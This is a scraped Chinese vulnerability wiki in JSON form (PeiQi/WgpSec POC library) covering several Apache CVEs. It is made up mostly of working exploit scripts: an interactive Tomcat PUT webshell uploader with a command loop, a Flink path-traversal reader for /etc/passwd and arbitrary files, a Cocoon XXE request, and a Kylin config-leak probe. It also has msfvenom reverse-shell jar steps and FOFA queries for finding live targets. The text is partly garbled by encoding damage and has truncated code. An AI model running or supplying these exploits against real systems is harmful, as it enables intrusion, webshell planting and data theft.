é™¤æ–‡ä»¶ æ¼æ´åˆ©ç”¨POC [!NOTE] ä»£ç åªç”¨äºæ£€æµ‹æ¼æ´ï¼Œåå¼¹shellå‚ç…§ä¸Šæ–¹ #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import hashlib import sys import requests import random import re def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Tomcat 7.0.0 - 7.0.81 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 CVE-2017-12615.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8080 \\033[0m') print('+ \\033[36mCmd >>> shell \\033[0m') print('+ \\033[36mCmd >>> exit(é€€å‡ºäº¤äº’å¹¶åˆ é™¤webshell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): md5_filename = str(random.randint(1,999)).encode(\"utf-8\") file_name = hashlib.md5(md5_filename).hexdigest() vuln_put_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"\"\" \"\"\" try: response = requests.request(\"PUT\", url=vuln_put_url, data=data, headers=headers, timeout=30) if response.status_code == 201 or response.status_code == 201: print(\"\\033[32m[o] å«æœ‰CVE-2017-12615æ¼æ´ï¼ŒæˆåŠŸä¸Šä¼ shellï¼Œæ–‡ä»¶åä¸º{}.jsp,å“åº”ä¸º{}\\033[0m\".format(file_name,response.status_code)) return file_name else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥,PUTæ–¹æ³•å…³é—­ \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥,PUTæ–¹æ³•å…³é—­ \\033[0m\") sys.exit(0) def POC_2(target_url, file_name, cmd): vuln_cmd_url = target_url + \"/\" + file_name + \".jsp?\" + \"pwd=peiqi&cmd=\" + cmd headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=vuln_cmd_url, headers=headers,timeout=30) if response.status_code == 200: print(\"\\033[32m[o] æˆåŠŸæ‰§è¡Œå‘½ä»¤,å“åº”ä¸º:\\n\\033[0m\",response.text) else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥,å‘½ä»¤æ— æ³•æ‰§è¡Œ \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥,å‘½ä»¤æ— æ³•æ‰§è¡Œ \\033[0m\") sys.exit(0) def POC_3(target_url, file_name): vuln_delect_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.request(\"DELETE\", url=vuln_delect_url, headers=headers, timeout=30) if response.status_code == 200 or 201: print(\"\\033[32m[o] æˆåŠŸåˆ é™¤shellï¼Œæ–‡ä»¶åä¸º{}.jsp,å“åº”ä¸º{}\\033[0m\".format(file_name,response.status_code)) return file_name else: print(\"\\033[31m[x] åˆ é™¤å¤±è´¥ \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] åˆ é™¤å¤±è´¥ \\033[0m\") sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = POC_1(target_url) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": POC_3(target_url, file_name) sys.exit(0) else: POC_2(target_url, file_name, cmd) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Tomcat/Apache Tomcat WebSocket æ‹’ç»æœåŠ¡æ¼æ´ CVE-2020-13935.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Tomcat/Apache Tomcat WebSocket æ‹’ç»æœåŠ¡æ¼æ´ CVE-2020-13935.html","title":"Apache Tomcat WebSocket æ‹’ç»æœåŠ¡æ¼æ´ CVE-2020-13935","keywords":"","body":"Apache Tomcat WebSocket æ‹’ç»æœåŠ¡æ¼æ´ CVE-2020-13935 æ¼æ´æè¿° 2020å¹´11æœˆ06æ—¥ï¼Œ360CERTç›‘æµ‹å‘ç°@RedTeamPentestingå‘å¸ƒäº†Tomcat WebSokcet æ‹’ç»æœåŠ¡æ¼æ´ çš„åˆ†ææŠ¥å‘Šï¼Œè¯¥æ¼æ´ç¼–å·ä¸º CVE-2020-13935 ï¼Œæ¼æ´ç­‰çº§ï¼šé«˜å± ï¼Œæ¼æ´è¯„åˆ†ï¼š7.5 ã€‚ æœªæˆæƒçš„è¿œç¨‹æ”»å‡»è€…é€šè¿‡å‘é€ å¤§é‡ç‰¹åˆ¶è¯·æ±‚åŒ… åˆ°TomcatæœåŠ¡å™¨ ,å¯é€ æˆæœåŠ¡å™¨åœæ­¢å“åº”å¹¶æ— æ³•æä¾›æ­£å¸¸æœåŠ¡ æ¼æ´å½±å“ [!NOTE] Apache Tomcat 10.0.0-M1-10.0.0-M6 Apache Tomcat 9.0.0.M1-9.0.36 Apache Tomcat 8.5.0-8.5.56 Apache Tomcat 7.0.27-7.0.104 ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2020-1938 docker-compose up -d æ¼æ´å¤ç° è®¿é—®ç›®æ ‡ï¼ŒæŸ¥çœ‹ç‰ˆæœ¬æ˜¯å¦åœ¨æ¼æ´ç‰ˆæœ¬èŒƒå›´å†… æŸ¥çœ‹æ”»å‡»å‰çš„å†…å­˜ä½¿ç”¨æƒ…å†µ CVE-2020-13935 EXPåœ°å€ [!NOTE] EXPä½¿ç”¨éœ€è¦GOç¯å¢ƒ å¦‚æœå‡ºç° go: github.com/gorilla/websocket@v1.4.2: Get \"https://proxy.golang.org/github.com/gorilla/websocket/@v/v1.4.2.mod\": dial tcp 172.217.160.81:443: connectex: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond. éœ€è¦ä½¿ç”¨å‘½ä»¤åˆ‡æ¢æº go env -w GOPROXY=https://goproxy.cn ä½¿ç”¨EXPæ”»å‡» tcdos ws://192.168.51.133:8080/examples/websocket/echoStreamAnnotation CPU è´Ÿè·è¶…è½½ï¼ŒæˆåŠŸæ”»å‡» æ¼æ´åˆ©ç”¨POC CVE-2020-13935 EXPåœ°å€ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Shiro/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Shiro/","title":"Apache Shio","keywords":"","body":"Apache Shiro Apache Shiro WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Shiro/Apache Shiro å°äº1.2.4ååºåˆ—åŒ–æ¼æ´ CVE-2016-4437.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Shiro/Apache Shiro å°äº1.2.4ååºåˆ—åŒ–æ¼æ´ CVE-2016-4437.html","title":"Apache Shiro =1.2.4ååºåˆ—åŒ–æ¼æ´ CVE-2016-4437","keywords":"","body":"Apache Shiro æ¼æ´æè¿° Apache Shiroæ˜¯ä¸€æ¬¾å¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚ Apache Shiro 1.2.4åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„ç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–åå­˜å‚¨åœ¨åä¸ºremember-meçš„Cookieä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨Shiroçš„é»˜è®¤å¯†é’¥ä¼ªé€ ç”¨æˆ·Cookieï¼Œè§¦å‘Javaååºåˆ—åŒ–æ¼æ´ï¼Œè¿›è€Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Shiro æ¼æ´ç¯å¢ƒ https://github.com/vulhub/vulhub.git cd vulhub/shiro/CVE-2016-4437 docker-compose up -d è®¿é—®http://xxx.xxx.xxx.xxx:8080/loginæ­£å¸¸å³å¯ æ¼æ´å¤ç° Shiroå·²ç»æœ‰æ¯”è¾ƒå®Œå–„çš„å·¥å…· https://github.com/insightglacier/Shiro_exploit https://github.com/feihong-cs/ShiroExploit/releases/tag/v2.51 è¿™é‡Œä½¿ç”¨çš„æ˜¯ ShiroExploit å·¥å…·è¿›è¡Œå¤ç° æ‰“å¼€åè¾“å…¥urlå³å¯ æˆåŠŸåå¼¹shell å‚è€ƒæ–‡ç«  Shiro RememberMe 1.2.4è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´-è¯¦ç»†åˆ†æ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Cocoon/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Cocoon/","title":"Apache Coocon","keywords":"","body":"Apache Cocoon Apache Cocoon XMLæ³¨å…¥ CVE-2020-11991 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Cocoon/Apache Cocoon XMLæ³¨å…¥ CVE-2020-11991.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Cocoon/Apache Cocoon XMLæ³¨å…¥ CVE-2020-11991.html","title":"Apache Cocoon XMLæ³¨å…¥ CVE-2020-11991","keywords":"","body":"Apache Cocoon XMLæ³¨å…¥ CVE-2020-11991 æ¼æ´æè¿° 9æœˆ11æ—¥ Apache è½¯ä»¶åŸºé‡‘ä¼šå‘å¸ƒå®‰å…¨å…¬å‘Šï¼Œä¿®å¤äº† Apache Cocoon xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼ˆCVE-2020-11991ï¼‰ã€‚ Apache Cocoon æ˜¯ä¸€ä¸ªåŸºäº Spring æ¡†æ¶çš„å›´ç»•åˆ†ç¦»ç†å¿µå»ºç«‹çš„æ„æ¶ï¼Œåœ¨è¿™ç§æ¡†æ¶ä¸‹çš„æ‰€æœ‰å¤„ç†éƒ½è¢«é¢„å…ˆå®šä¹‰å¥½çš„å¤„ç†ç»„ä»¶çº¿æ€§è¿æ¥èµ·æ¥ï¼Œèƒ½å¤Ÿå°†è¾“å…¥å’Œäº§ç”Ÿçš„è¾“å‡ºæŒ‰ç…§æµæ°´çº¿é¡ºåºå¤„ç†ã€‚ç”¨æˆ·ç¾¤ï¼šApache Lenyaã€Daisy CMSã€Hippo CMSã€Mindquarryç­‰ç­‰ï¼ŒApache Cocoon é€šå¸¸è¢«ä½œä¸ºä¸€ä¸ªæ•°æ®æŠ½å–ã€è½¬æ¢ã€åŠ è½½å·¥å…·æˆ–è€…æ˜¯ç³»ç»Ÿä¹‹é—´ä¼ è¾“æ•°æ®çš„ä¸­è½¬ç«™ã€‚CVE-2020-11991 ä¸ StreamGenerator æœ‰å…³ï¼Œåœ¨ä½¿ç”¨ StreamGenerator æ—¶ï¼Œä»£ç å°†è§£æç”¨æˆ·æä¾›çš„ xmlã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨åŒ…æ‹¬å¤–éƒ¨ç³»ç»Ÿå®ä½“åœ¨å†…çš„ç‰¹åˆ¶ xml æ¥è®¿é—®æœåŠ¡å™¨ç³»ç»Ÿä¸Šçš„ä»»ä½•æ–‡ä»¶ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Cocoon FOFA [!NOTE] app=\"Apache-Cocoon\" æ¼æ´å¤ç° å‘/v2/api/product/manger/getInfo POSTå¦‚ä¸‹å†…å®¹ ]> John &ent; æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Cocoon >> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/v2/api/product/manger/getInfo\" data = \"\"\" ]> John &ent; \"\"\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } response = requests.request(\"POST\", url=vuln_url, data=data, headers=headers, timeout=20) if \"/bin/bash\" in response.text: print(\"\\033[32m[o] å«æœ‰CVE-2020-11991æ¼æ´ï¼Œå“åº”ä¸º{}\\033[0m\".format(response.text)) else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Flink/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Flink/","title":"Apache Flink ","keywords":"","body":"Apache Flink Apache Flink Apache Flink ç›®å½•éå†æ¼æ´ CVE-2020-17519 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Flink/Apache Flink å°äº1.9.1è¿œç¨‹ä»£ç æ‰§è¡Œ CVE-2020-17518.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Flink/Apache Flink å°äº1.9.1è¿œç¨‹ä»£ç æ‰§è¡Œ CVE-2020-17518.html","title":"Apache Flink å°äº1.9.1è¿œç¨‹ä»£ç æ‰§è¡Œ CVE-2020-17518","keywords":"","body":"Apache Flink æ¼æ´æè¿° è¿‘æ—¥,æœ‰å®‰å…¨ç ”ç©¶å‘˜å…¬å¼€äº†ä¸€ä¸ªApache Flinkçš„ä»»æ„JaråŒ…ä¸Šä¼ å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œçš„æ¼æ´. æ¼æ´å½±å“ [!NOTE] Apache Flink FOFA FOFA è¯­å¥ app=\"Apache-Flink\" && country=\"CN\" å›½å†…è¿˜æ˜¯å¾ˆå¤šä½¿ç”¨ Apache Flink çš„ï¼Œå¤§æ¦‚æœ‰1000çš„æ•°é‡å·¦å³ æ¼æ´å¤ç° æ‰“å¼€ä¸€ä¸ªä½¿ç”¨ Apache Flink çš„ç½‘ç«™ï¼Œæ‰“å¼€åé¡µé¢ä¸ºè¿™æ ·å­ ç‚¹å‡»æŸ¥çœ‹æ–‡ä»¶ä¸Šä¼ é¡µé¢ æ‰“å¼€MSF ç”Ÿæˆä¸€ä¸ª jar æœ¨é©¬ msfvenom -p java/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 -f jar > test.jar ç‚¹å‡» Add ä¸Šä¼  jar æ–‡ä»¶ ç›‘å¬ç«¯å£ msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) > set payload java/shell/reverse_tcp payload => java/shell/reverse_tcp msf6 exploit(multi/handler) > set lhost xxx.xxx.xxx.xxx lhost => xxx.xxx.xxx.xxx msf6 exploit(multi/handler) > set lport 4444 lport => 4444 msf6 exploit(multi/handler) > run ç‚¹å‡»ä¸‹ submit åå¼¹å›æ¥ä¸€ä¸ªroot æƒé™shell æ¼æ´æ£€æµ‹POC import requests def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Flink >> http://xxx.xxx.xxx.xxx:9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/jars/upload\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \"Unable to load requested file /jars/upload.\" in response.text: print(\"\\033[32m[o] å¯èƒ½å­˜åœ¨ Apache Flink >> \\033[0m\")) POC_1(target_url) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Flink/Apache Flink ç›®å½•éå†æ¼æ´ CVE-2020-17519.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Flink/Apache Flink ç›®å½•éå†æ¼æ´ CVE-2020-17519.html","title":"Apache Flink ç›®å½•éå†æ¼æ´ CVE-2020-17519","keywords":"","body":"Apache Flink ç›®å½•éå†æ¼æ´ CVE-2020-17519 æ¼æ´æè¿° 2021å¹´01æœˆ06æ—¥ï¼Œ360CERTç›‘æµ‹å‘ç°Apache Flinkå‘å¸ƒäº†Apache Flink ç›®å½•ç©¿è¶Šæ¼æ´,ç›®å½•ç©¿è¶Šæ¼æ´çš„é£é™©é€šå‘Šï¼Œæ¼æ´ç¼–å·ä¸ºCVE-2020-17518,CVE-2020-17519ï¼Œæ¼æ´ç­‰çº§ï¼šé«˜å±ï¼Œæ¼æ´è¯„åˆ†ï¼š8.5ã€‚ è¿œç¨‹æ”»å‡»è€…é€šè¿‡REST APIç›®å½•éå†ï¼Œå¯é€ æˆæ–‡ä»¶è¯»å–/å†™å…¥çš„å½±å“ã€‚ æ¼æ´å½±å“ [!NOTE] Apache Flink 1.11.0 Apache Flink 1.11.1 Apache Flink 1.11.2 FOFA [!NOTE] app=\"Apache Flink\" ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519 æ¼æ´å¤ç° POC: http://xxx.xxx.xxx.xxx/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd æ¼æ´åˆ©ç”¨POC import requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Flink 1.11.0-1.11.2 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 CVE-2020-17519.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mFile >>> /etc/passwd \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_name): file_name = file_name.replace(\"/\", \"%252f\") vuln_url = target_url + \"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}\".format(file_name) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] è¯·æ±‚URL ï¼š {}\\033[0m\".format(vuln_url)) if \"root\" in response.text: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´,æˆåŠŸè¯»å– /etc/passwd ï¼Œå“åº”ä¸º:\\n{}\\033[0m\".format(target_url, response.text)) else : print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, file_name): file_name_re = file_name.replace(\"/\", \"%252f\") vuln_url = target_url + \"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}\".format(file_name_re) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] è¯·æ±‚URL ï¼š {}\\033[0m\".format(vuln_url)) if \"error\" not in response.text: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´,æˆåŠŸè¯»å– {} ï¼Œå“åº”ä¸º:\\n{}\\033[0m\".format(target_url, file_name, response.text)) else : print(\"\\033[31m[x] ç›®æ ‡æ–‡ä»¶{}è¯»å–å¤±è´¥\\033[0m\".format(file_name)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = \"/etc/passwd\" POC_1(target_url, file_name) while True: file_name = input(\"\\033[35mFile >>> \\033[0m\") if file_name == \"exit\": sys.exit(0) else: POC_2(target_url, file_name) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/","title":"Apache Kylin","keywords":"","body":"Apache Kylin Apache-kylin æœªæˆæƒé…ç½®æ³„éœ² CVE-2020-13937 Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956 Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-13925 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ².html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ².html","title":"Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ² CVE-2020-13937","keywords":"","body":"Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ² CVE-2020-13937 FOFA app=\"APACHE-kylin\" å—å½±å“çš„ç‰ˆæœ¬ï¼š Apache Kylin æœ‰ä¸€ä¸ªrestful apiä¼šåœ¨æ²¡æœ‰è®¤å¯è®¤è¯çš„æƒ…å†µä¸‹æš´éœ²é…ç½®ä¿¡æ¯ã€‚ Kylin 2.x.x Kylin Kylin 4.0.0-alpha æ¼æ´åˆ©ç”¨ æ ¹æ®æ¼æ´æƒ…æŠ¥ æ¼æ´åˆ©ç”¨POCä¸ºhttp://xxx.xxx.xxx.xxx/kylin/api/admin/config æ¼æ´æ£€æµ‹POC import requests def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Kylin 2.x.x >> http://xxx.xxx.xxx.xxx:9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/kylin/api/admin/config\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \"config\" in response.text: print(\"\\033[32m[o] å­˜åœ¨Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ²\\n[o] å“åº”ä¸º:\\n\\033[0m\",response.text) else: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") except: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) å‚è€ƒ CVE-2020-13937|Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ²æ¼æ´ï¼Œè…¾è®¯å®‰å…¨å…¨é¢æ”¯æŒæ£€æµ‹ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956.html","title":"Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956","keywords":"","body":"Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956 æ¼æ´æè¿° 2020å¹´5æœˆ22æ—¥ï¼ŒCNVD é€šæŠ¥äº† Apache Kylin å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956ï¼Œåœ°å€åœ¨ http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202005-1133 ã€‚ Apache Kylin æ˜¯ç¾å›½ Apache è½¯ä»¶åŸºé‡‘ä¼šçš„ä¸€æ¬¾å¼€æºçš„åˆ†å¸ƒå¼åˆ†æå‹æ•°æ®ä»“åº“ã€‚è¯¥äº§å“ä¸»è¦æä¾› Hadoop/Spark ä¹‹ä¸Šçš„ SQL æŸ¥è¯¢æ¥å£åŠå¤šç»´åˆ†æï¼ˆOLAP**ï¼‰ç­‰åŠŸèƒ½ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1 ç¯å¢ƒæ­å»º è¿™é‡Œä½¿ç”¨ docker æ¥æ­å»ºéœ€è¦çš„ç¯å¢ƒ Kylinå®˜æ–¹æ–‡æ¡£ docker pull apachekylin/apache-kylin-standalone:3.0.1 [!NOTE] å¦‚æœæœåŠ¡å™¨å†…å­˜è¾ƒå°ï¼Œå¯ä¸é€‰æ‹© -m 8G å‚æ•° docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 æ‰“å¼€åä½¿ç”¨é»˜è®¤è´¦å·å¯†ç admin/KYLINç™»å½•ï¼Œå‡ºç°åˆå§‹ç•Œé¢å³ä¸ºæˆåŠŸ æ¼æ´åˆ†æ æŸ¥çœ‹è¿™ä¸ªæ¼æ´ä¿®å¤çš„è¡¥ä¸ æŸ¥çœ‹åœ°å€ è¿™é‡Œå¯ä»¥çœ‹åˆ°æ­¤æ¼æ´æœ‰å…³çš„å‚æ•°æœ‰ä¸‰ä¸ªï¼Œåˆ†åˆ«æ˜¯ srcCfgUriã€dstCfgUriã€projectNameï¼Œç›¸å…³çš„å‡½æ•°ä¸º migrateCube å®˜æ–¹æ–‡æ¡£ä¸­å¯¹ migrateCube çš„æè¿° POST /kylin/api/cubes/{cube}/{project}/migrate ä¸‹è½½ Apache Kylin 3.0.1 çš„æºä»£ç è¿›è¡Œä»£ç å®¡è®¡,å‡ºç°æ¼æ´å‡½æ•°çš„æ–‡ä»¶ä¸ºä»¥ä¸‹è·¯å¾„ apache-kylin-3.0.1\\server-base\\src\\main\\java\\org\\apache\\kylin\\rest\\service\\CubeService.java æ‰¾åˆ°migrateCubeå‡½æ•° 